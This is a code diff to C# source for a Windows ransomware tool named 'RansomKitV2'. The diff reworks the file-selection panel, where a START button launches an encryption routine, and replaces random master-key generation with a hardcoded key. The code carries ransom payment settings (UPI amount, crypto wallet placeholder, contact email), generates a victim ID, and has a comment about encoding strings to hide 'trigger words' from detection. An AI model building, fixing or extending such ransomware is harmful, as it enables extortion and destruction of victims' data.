@@ -22,6 +22,8 @@ namespace RansomKitV2
         private const string _UPI_AMT = "5000";
         private const string _BNB = "0xYourBinanceWalletAddressHere";
         private const string _MAIL = "support@yourdomain.com";
+
+        private const string _MASTER_KEY_B64 = "billahaikillaleleuskadhila"; // ← add this
         // ─────────────────────────────────────────────────────────────
 
         // Encoded label strings (σ-decoded at runtime so trigger words
@@ -162,37 +164,70 @@ namespace RansomKitV2
         {
             _setupPanel = MakePanel();
 
-            var hdr = MakeLbl("SELECT PATHS TO PROCESS", 12, 14, _ACC,
-                              new Font("Segoe UI", 10f, FontStyle.Bold));
+            // Header — always pinned to top, no anchor math needed
+            var hdrBar = new Panel { Dock = DockStyle.Top, Height = 38, BackColor = _BG };
+            hdrBar.Controls.Add(new Label
+            {
+                Text = "SELECT PATHS TO PROCESS",
+                ForeColor = _ACC,
+                Font = new Font("Segoe UI", 10f, FontStyle.Bold),
+                AutoSize = true,
+                Location = new Point(12, 10)
+            });
 
+            // Button strip — always pinned to bottom, fixed height
+            // Using Dock instead of Anchor avoids the "parent height=0 at
+            // construction time → negative distance → buttons at y=982" bug.
+            var strip = new Panel { Dock = DockStyle.Bottom, Height = 90, BackColor = _BG };
+
+            var btnFile = MakeBtn("Add File", new Point(12, 8), _BG2, 96);
+            var btnFolder = MakeBtn("Add Folder", new Point(118, 8), _BG2, 96);
+            var btnRemove = MakeBtn("Remove", new Point(224, 8), _BG2, 80);
+            var btnStart = MakeBtn("▶  START", new Point(12, 46), _ACC, 200);
+            btnStart.Height = 36;
+            btnStart.Font = new Font("Segoe UI", 11f, FontStyle.Bold);
+
+            // Stretch START to full strip width without using Anchor
+            // (Anchor Left|Right on a zero-width parent has the same bug)
+            strip.SizeChanged += (_, _) =>
+            {
+                int w = strip.ClientSize.Width - 24;
+                if (w > 0) btnStart.Width = w;
+            };
+
+            strip.Controls.AddRange(new Control[] { btnFile, btnFolder, btnRemove, btnStart });
+
+            // List wrapper — fills the space between header and strip
+            var listWrap = new Panel
+            {
+                Dock = DockStyle.Fill,
+                BackColor = _BG,
+                Padding = new Padding(12, 4, 12, 4)
+            };
             _pathList = new ListBox
             {
-                Location = new Point(12, 44),
-                Size = new Size(400, 310),
+                Dock = DockStyle.Fill,
                 BackColor = _BG2,
                 ForeColor = _TXT,
                 BorderStyle = BorderStyle.FixedSingle,
                 Font = new Font("Consolas", 9f),
-                SelectionMode = SelectionMode.MultiExtended,
-                Anchor = AnchorStyles.Top | AnchorStyles.Left |
-                                 AnchorStyles.Right | AnchorStyles.Bottom
+                SelectionMode = SelectionMode.MultiExtended
             };
-
-            var btnFile = MakeBtn("Add File", new Point(12, 364), _BG2, 96);
-            var btnFolder = MakeBtn("Add Folder", new Point(118, 364), _BG2, 96);
-            var btnRemove = MakeBtn("Remove", new Point(224, 364), _BG2, 80);
-            var btnStart = MakeBtn("▶  START", new Point(12, 406), _ACC, 400);
-            btnStart.Height = 44;
-            btnStart.Font = new Font("Segoe UI", 11f, FontStyle.Bold);
+            listWrap.Controls.Add(_pathList);
 
             btnFile.Click += (_, _) => BrowseFile();
             btnFolder.Click += (_, _) => BrowseFolder();
             btnRemove.Click += (_, _) => RemovePaths();
             btnStart.Click += (_, _) => _ = EncryptAsync();
 
-            _setupPanel.Controls.AddRange(new Control[] {
-                hdr, _pathList, btnFile, btnFolder, btnRemove, btnStart
-            });
+            // Add order determines docking priority — WinForms layout engine
+            // processes controls from the highest Controls-index down to 0:
+            //   [2] strip   (Bottom) → claims bottom 90 px first
+            //   [1] hdrBar  (Top)    → claims top 38 px next
+            //   [0] listWrap (Fill)  → gets whatever remains in the middle
+            _setupPanel.Controls.Add(listWrap);  // index 0
+            _setupPanel.Controls.Add(hdrBar);    // index 1
+            _setupPanel.Controls.Add(strip);     // index 2
         }
 
         // ── Progress panel ────────────────────────────────────────────
@@ -404,8 +439,12 @@ namespace RansomKitV2
                 try
                 {
                     // _0xCE.GenerateMasterKey()
-                    _masterKey = CryptoEngine.GenerateMasterKey();
-                    string password = CryptoEngine.MasterKeyToPassword(_masterKey);
+
+
+                    _masterKey = Convert.FromBase64String(_MASTER_KEY_B64);
+                    string password = _MASTER_KEY_B64;
+
+
                     string keyHash = CryptoEngine.HashMasterKey(_masterKey);
                     string victimId = Guid.NewGuid().ToString("N").ToUpper()[..16];
 
